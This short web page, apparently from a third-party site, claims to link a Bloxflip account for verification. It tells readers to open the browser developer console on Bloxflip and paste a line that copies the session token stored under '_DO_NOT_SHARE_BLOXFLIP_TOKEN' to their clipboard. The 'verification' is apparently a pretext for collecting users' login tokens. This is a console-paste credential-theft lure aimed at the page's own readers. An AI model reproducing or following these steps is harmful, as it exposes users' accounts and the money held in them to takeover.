Connect an Account to Verify

Follow These Steps

To Link Your Bloxflip Account

  1. Head over to Bloxflip
  2. Simultaneously press Ctrl+Shift+I
  3. Click on the Console tab
  4. Paste this code into your console
copy(localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN'));

If the console says undefined, it should be in your clipboard.
